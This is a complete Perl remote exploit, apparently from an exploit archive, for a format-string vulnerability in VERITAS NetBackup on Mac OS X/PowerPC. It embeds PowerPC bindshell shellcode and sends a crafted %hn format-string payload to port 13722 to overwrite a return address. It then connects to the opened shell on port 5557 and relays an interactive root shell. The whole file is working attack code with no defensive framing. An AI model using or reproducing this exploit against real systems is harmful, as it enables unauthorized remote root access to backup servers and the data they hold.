#!/usr/bin/perl
# VERITAS-OSX.pl - VERITAS NetBackup Format Strings OSX/ppc Remote Exploit
# Original code by johnh[at]digitalmunition[dot]com modified by KF to work on OSX / ppc
# bug found by kf_lists[at]digitalmunition[dot]com
# http://www.digitalmunition.com/
#
# This exploit May NOT be posted to a public Archive like k-otik without being
# in its original GPG form (protected by passphrase)

use POSIX;
use IO::Socket;
use IO::Select;

my $shellcode = # /* OSX BINDSHELLCODE PORT=5557 NO-0x0 */
"\x60\x60\x60\x60" x 10 . 
"\x7c\x63\x1a\x79\x40\x82\xff\xfd\x7d\xa8\x02\xa6\x38\xc3\xe1\x1d".
"\x39\x80\x01\x18\x39\xad\x1f\xff\x81\xcd\xe1\x21\x81\xed\xe1\x1d".
"\x7d\xef\x72\x78\x91\xed\xe1\x1d\x7c\x06\x68\xac\x7c\x01\x04\xac".
"\x7c\x06\x6f\xac\x4c\x01\x01\x2c\x39\xad\xff\xfc\x39\x8c\xff\xfb".
"\x7d\x8c\x63\x79\x40\x82\xff\xd8\x94\x81\x7d\x7d\x94\x61\x7d\x7e".
"\x94\x41\x7d\x79\x94\xe1\x7d\x1e\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07".
"\xd0\x9f\x66\x07\xe4\xe1\x7d\x72\xac\xe3\x68\xca\xac\xe1\x7d\x7f".
"\xd0\x69\x7f\xd9\x94\x41\x7d\x6f\x94\xe1\x7d\x17\xd3\x22\x8e\x07".
"\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07\x94\xe1\x7d\x15\xd3\x22\x8e\x07".
"\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07\xd3\x22\x8e\x07\x94\xe1\x7d\x61".
"\x94\x61\x7d\x6f\x3c\x60\x82\x97\x94\x40\x82\x97\x94\x60\x82\x8f".
"\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07\xd0\x9f\x66\x07\x94\x41\x7d\x7d".
"\x94\xe1\x7d\x25\xd3\x22\x8e\x07\xd0\x45\x56\x07\xe8\xe1\x7d\x7d".
"\xd0\xe1\x7f\x07\x94\x44\x82\x80\x80\xe4\x82\x80\xec\x63\x82\x9a".
"\x94\xe1\x7d\x3d\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07\xd0\x44\x57\x06".
"\xec\x63\x82\x82\xd0\x89\x7f\xd9\x94\x82\x7d\x57\x3c\x80\x82\x87".
"\x3c\x40\x82\x83\x94\x60\x82\x87\x94\xe1\x7d\x44\xd0\xe1\x79\xd3".
"\xe8\xe1\x7d\x7d\xd0\xe1\x7f\x07\xd3\x01\x7d\x77\x83\x83\x14\x11".
"\x83\x82\x0e\x17\xac\xe1\x7d\x7f\xac\xe1\x7d\x7f";

my $host = shift || '192.168.1.111';
my $port = shift || 13722;
my $sock = new IO::Socket::INET(
PeerAddr => $host,
PeerPort => $port,
Proto => 'tcp');
$sock or die "no socket :$!";

print $sock " 118 1\n" .
# "a" x 150 . "\n";
$shellcode . "\n";


print scalar <$sock>;
print scalar <$sock>;

#sleep 10;

print $sock " 101 6\n" . 

# my $ret = 0xbffe5738; # Saved return from frame 1 vsprintf
# write to 0xbffe5738+2 FIRST then write to 0xbffe5738. 
# this allows the wrap past 0xffff to occur so we can form 0010
"\xbf\xfe\x57\x3a" . "ZZZZ" . "\xbf\xfe\x57\x38" . "%x" x 14 . 

# shellcode is around 0x001009e8

# "%2474x" # 0x09e8
"%2280x" # 0x0920?
. "%hn" . 
"%63212x." # form 0x0010 by wrapping past 0xffff
. "%hn". 
"\n" .

"A" x 50 . "\n" .
"B" x 50 . "\n" . 
"C" x 50 . "\n" . 
# "D" x 50 . "\n" . # shellcode alternate location?
$shellcode . "\n" . 
"E" x 50 . "\r\n";

print scalar <$sock>;

close $sock;


my $shellport = 5557;
print "[*] Connect to remote shell port\n";
my $sock = IO::Socket::INET->new (
Proto => "tcp",
PeerAddr => $host,
PeerPort => $shellport,
Type => SOCK_STREAM
);

if (! $sock)
{
print "[*] Error, Seems Failed\n";
exit (0);
}
print "[*] G0t R00T\n";
StartShell ($sock);
sub StartShell
{
my ($client) = @_;
my $sel = IO::Select->new();


# unbuffered fun.


Unblock(*STDIN);
Unblock(*STDOUT);
Unblock($client);

select($client); $|++;
select(STDIN); $|++;
select(STDOUT); $|++;

$sel->add($client);
$sel->add(*STDIN);

while (fileno($client))
{
my $fd;
my @fds = $sel->can_read(1);
foreach $fd (@fds)
{
my $in = <$fd>;
if (! $in || ! $fd || ! $client)
{
print "[*] Closing connection.\n";
close($client);
exit(0);
}

if ($fd eq $client)
{
print STDOUT $in;
} else {
print $client $in;
}
}
}
close ($client);
exit (0);
}

sub Unblock {
my $fd = shift;
my $flags;
$flags = fcntl($fd,F_GETFL,0) || die "Can't get flags for file handle: $!\n";
fcntl($fd, F_SETFL, $flags|O_NONBLOCK) || die "Can't make handle nonblocking: $!\n";
}